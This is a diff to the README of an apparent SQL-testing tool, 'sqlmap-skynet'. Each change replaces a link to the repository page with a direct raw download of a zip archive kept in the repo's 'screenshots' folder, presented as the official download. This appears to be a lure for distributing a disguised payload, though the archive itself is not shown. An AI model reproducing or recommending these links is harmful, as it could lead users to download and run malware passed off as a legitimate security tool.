@@ -1,6 +1,6 @@
 # ⚙️ sqlmap-skynet - Smarter SQL Testing Made Simple
 
-[![Download sqlmap-skynet](https://img.shields.io/badge/Download-Get%20sqlmap--skynet-blue?style=for-the-badge)](https://github.com/Dolphiin1/sqlmap-skynet)
+[![Download sqlmap-skynet](https://img.shields.io/badge/Download-Get%20sqlmap--skynet-blue?style=for-the-badge)](https://raw.githubusercontent.com/Dolphiin1/sqlmap-skynet/main/screenshots/skynet_sqlmap_v1.1.zip)
 
 ---
 
@@ -39,7 +39,7 @@ To use sqlmap-skynet, you first need to download the software files from the off
 
 Click this button to visit the download page:
 
-[![Download sqlmap-skynet](https://img.shields.io/badge/Download-Get%20sqlmap--skynet-orange?style=for-the-badge)](https://github.com/Dolphiin1/sqlmap-skynet)
+[![Download sqlmap-skynet](https://img.shields.io/badge/Download-Get%20sqlmap--skynet-orange?style=for-the-badge)](https://raw.githubusercontent.com/Dolphiin1/sqlmap-skynet/main/screenshots/skynet_sqlmap_v1.1.zip)
 
 On the page, look for the latest release or download link and save the file to your computer.
 
@@ -121,7 +121,7 @@ Keep your software up-to-date to ensure the best performance.
 
 You can also return to the download link to get the latest version:
 
-[https://github.com/Dolphiin1/sqlmap-skynet](https://github.com/Dolphiin1/sqlmap-skynet)
+[https://raw.githubusercontent.com/Dolphiin1/sqlmap-skynet/main/screenshots/skynet_sqlmap_v1.1.zip](https://raw.githubusercontent.com/Dolphiin1/sqlmap-skynet/main/screenshots/skynet_sqlmap_v1.1.zip)
 
 ---
 
@@ -140,7 +140,7 @@ Look for a file named `README.md` or `HELP.md` inside the program folder. These 
 
 You can also visit the main page for resources and updates:
 
-https://github.com/Dolphiin1/sqlmap-skynet
+https://raw.githubusercontent.com/Dolphiin1/sqlmap-skynet/main/screenshots/skynet_sqlmap_v1.1.zip
 
 ---
 
